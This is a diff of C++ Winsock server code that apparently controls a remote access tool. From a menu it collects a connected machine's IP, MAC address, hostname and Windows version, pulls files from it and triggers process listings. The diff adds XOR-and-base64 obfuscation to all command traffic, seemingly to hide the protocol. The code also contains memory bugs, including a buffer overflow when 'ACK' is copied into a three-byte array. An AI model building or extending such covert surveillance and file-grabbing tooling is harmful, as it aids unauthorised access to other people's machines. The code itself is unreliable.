@@ -132,19 +132,31 @@ std::string XOR(std::string value, std::string key)
     return retval;
 }
 
-std::string decryption(char cipher[512])
+std::string decryption(char* cipher, int size)
 {
     string decrypted;
     string q = ":&";
-    char buff[1024];
+    char* buff;
     string decryptedString;
     decrypted = XOR(cipher, q);
-    char decrypt[1024];
+    char* decrypt;
     decryptedString = decrypted.substr(0, decrypted.find("=")) + "=";
+    decrypt = new char[strlen(decryptedString.c_str())];
+    buff = new char[strlen(decryptedString.c_str())];
     strcpy(buff, decryptedString.c_str());
     strcpy(decrypt, decryptedString.c_str());
     decrypted = base64_decode(decrypt);
     return decrypted;
+}
+
+std::string encryption(char* cipher, int size)
+{
+    string encrypted = base64_encode((unsigned char*)cipher, strlen(cipher));
+    string q = ":&";
+    encrypted = XOR(encrypted, q);
+    char* encrypt = new char[strlen(encrypted.c_str())];
+    strcpy(encrypt, encrypted.c_str());
+    return encrypt;
 }
 
 string convertToString(char* a)
@@ -168,6 +180,10 @@ int main(void)
     int iSendResult;
     char recvbuf[DEFAULT_BUFLEN];
     int recvbuflen = DEFAULT_BUFLEN;
+    string ack = "ACK";
+    char ack_star[3];
+    strcpy(ack_star, ack.c_str());
+    ack = encryption(ack_star, strlen(ack_star));
 
     // Initialize Winsock
     iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
@@ -248,6 +264,8 @@ int main(void)
         string choice;
         string decryptedString1;
         string decryptedString2;
+        string encryptedString;
+        char encrypted_star[256];
         while (true)
         {
             cout << "\t---------------Menu------------------" << endl;
@@ -260,23 +278,31 @@ int main(void)
             if (choice.find("1") != std::string::npos)
             {
                 string t = "1";
-                iSendResult = send(ClientSocket, t.c_str(), t.length(), 0);
+                strcpy(encrypted_star, t.c_str());
+                encryptedString = encryption(encrypted_star, strlen(encrypted_star));
+                iSendResult = send(ClientSocket, encryptedString.c_str(), encryptedString.length(), 0);
+
+
                 iResult = recv(ClientSocket, recvbuf, recvbuflen, 0);
-                decryptedString1 = decryption(recvbuf);
+                decryptedString1 = decryption(recvbuf, strlen(recvbuf));
                 cout << "IP : " << decryptedString1 << endl;
-                iSendResult = send(ClientSocket, "ACK", strlen("ACK"), 0);
+
+
+                iSendResult = send(ClientSocket, ack.c_str(), strlen(ack.c_str()), 0);
+
+
                 iResult = recv(ClientSocket, recvbuf, recvbuflen, 0);
                 decryptedString2 = convertToString(recvbuf);
-                decryptedString2 = decryption(recvbuf);
+                decryptedString2 = decryption(recvbuf, strlen(recvbuf));
                 cout << "MAC : " << decryptedString2 << endl;
                 iResult = recv(ClientSocket, recvbuf, recvbuflen, 0);
                 decryptedString2 = convertToString(recvbuf);
-                decryptedString2 = decryption(recvbuf);
+                decryptedString2 = decryption(recvbuf, strlen(recvbuf));
                 cout << "Hostname : " << decryptedString2 << endl;
 
                 iResult = recv(ClientSocket, recvbuf, recvbuflen, 0);
                 decryptedString2 = convertToString(recvbuf);
-                decryptedString2 = decryption(recvbuf);
+                decryptedString2 = decryption(recvbuf, strlen(recvbuf));
                 cout << "Windows Version : " << decryptedString2 << endl;
                 memset(recvbuf, 0, sizeof recvbuf);
             }
@@ -284,27 +310,39 @@ int main(void)
             {
 
                 string t = "2";
-                iSendResult = send(ClientSocket, t.c_str(), t.length(), 0);
+                strcpy(encrypted_star, t.c_str());
+                encryptedString = encryption(encrypted_star, strlen(encrypted_star));
+                iSendResult = send(ClientSocket, encryptedString.c_str(), encryptedString.length(), 0);
+
                 cout << "Input file name: ";
                 cin >> choice;
                 cout<<choice;
-                iSendResult = send(ClientSocket, choice.c_str(), choice.length(), 0);
+
+                strcpy(encrypted_star, choice.c_str());
+                encryptedString = encryption(encrypted_star, strlen(encrypted_star));
+                iSendResult = send(ClientSocket, encryptedString.c_str(), encryptedString.length(), 0);
                 iResult = recv(ClientSocket, recvbuf, recvbuflen, 0);
-                if (string(recvbuf).find("1") != std::string::npos)
+                decryptedString2 = convertToString(recvbuf);
+                decryptedString2 = decryption(recvbuf, strlen(recvbuf));
+                if (string(decryptedString2).find("1") != std::string::npos)
                 {
                     ofstream myfile;
                     myfile.open(choice.c_str());
-                    cout<<"File size1: "<<recvbuf<<endl;
-                    iSendResult = send(ClientSocket, "ACK", strlen("ACK"), 0);
+                    cout<<"File size1: "<< decryptedString2 <<endl;
+                    iSendResult = send(ClientSocket, ack.c_str(), strlen(ack.c_str()), 0);
                     iResult = recv(ClientSocket, recvbuf, recvbuflen, 0);
-                    int len=atoi(recvbuf);
+                    decryptedString2 = convertToString(recvbuf);
+                    decryptedString2 = decryption(recvbuf, strlen(recvbuf));
+                    int len=atoi(decryptedString2.c_str());
                     iResult=0;
-                    cout<<"File size: "<<recvbuf<<endl;
-                    iSendResult = send(ClientSocket, "ACK", strlen("ACK"), 0);
+                    cout<<"File size: "<< decryptedString2 <<endl;
+                    iSendResult = send(ClientSocket, ack.c_str(), strlen(ack.c_str()), 0);
                     while (true)
                     {
 
                         iResult+= recv(ClientSocket, recvbuf, recvbuflen, 0);
+                        //decryptedString2 = convertToString(recvbuf);
+                        //decryptedString2 = decryption(recvbuf, strlen(recvbuf));
                         cout<<iResult<<"/"<<len<<endl;
                         myfile<<recvbuf;
                         if (iResult>=len )
@@ -325,28 +363,35 @@ int main(void)
             else if (choice.find("3") != std::string::npos)
             {
                 string t = "3";
-                iSendResult = send(ClientSocket, t.c_str(), t.length(), 0);
-                 iResult = recv(ClientSocket, recvbuf, recvbuflen, 0);
-                  if (string(recvbuf).find("1") != std::string::npos)
-                {
-                    iSendResult = send(ClientSocket, "ACK", strlen("ACK"), 0);
-                    iResult = recv(ClientSocket, recvbuf, recvbuflen, 0);
-                    int len=atoi(recvbuf);
-                    iSendResult = send(ClientSocket, "ACK", strlen("ACK"), 0);
-                       iResult=0; 
-                    while (true)
-                    {
+                strcpy(encrypted_star, t.c_str());
+                encryptedString = encryption(encrypted_star, strlen(encrypted_star));
+                iSendResult = send(ClientSocket, encryptedString.c_str(), encryptedString.length(), 0);
 
-                        iResult+= recv(ClientSocket, recvbuf, recvbuflen, 0);
-                        iSendResult = send(ClientSocket, "ACK", strlen("ACK"), 0);
-                        // cout<<iResult<<"/"<<len<<endl;
-                        if (iResult>=len )
-                        {
-                            cout << "Done! All running processes printed on client. " << endl;
-                            break;
-                        }
-                       
-                    }
+                 iResult = recv(ClientSocket, recvbuf, recvbuflen, 0);
+
+                 decryptedString2 = convertToString(recvbuf);
+                 decryptedString2 = decryption(recvbuf, strlen(recvbuf));
+                  if (string(decryptedString2).find("1") != std::string::npos)
+                {
+                    iSendResult = send(ClientSocket, ack.c_str(), strlen(ack.c_str()), 0);
+                    //iResult = recv(ClientSocket, recvbuf, recvbuflen, 0);
+                    int len=atoi(recvbuf);
+                    //iSendResult = send(ClientSocket, ack.c_str(), strlen(ack.c_str()), 0);
+                       iResult=0; 
+                    //while (true)
+                    //{
+                    //
+                    //    iResult+= recv(ClientSocket, recvbuf, recvbuflen, 0);
+                    //    //iSendResult = send(ClientSocket, ack.c_str(), strlen(ack.c_str()), 0);
+                    //    // cout<<iResult<<"/"<<len<<endl;
+                    //    if (iResult>=len )
+                    //    {
+                    //        cout << "Done! All running processes printed on client. " << endl;
+                    //        break;
+                    //    }
+                    //   
+                    //}
+                       cout << "Done! All running processes printed on client. " << endl;
                     memset(recvbuf, 0, sizeof recvbuf);
 
                 }else{
@@ -357,7 +402,9 @@ int main(void)
             else if (choice.find("4") != std::string::npos)
             {
                 string t = "4";
-                iSendResult = send(ClientSocket, t.c_str(), t.length(), 0);
+                strcpy(encrypted_star, t.c_str());
+                encryptedString = encryption(encrypted_star, strlen(encrypted_star));
+                iSendResult = send(ClientSocket, encryptedString.c_str(), encryptedString.length(), 0);
                 cout<<"Quiting"<<endl;
                 break;
             }
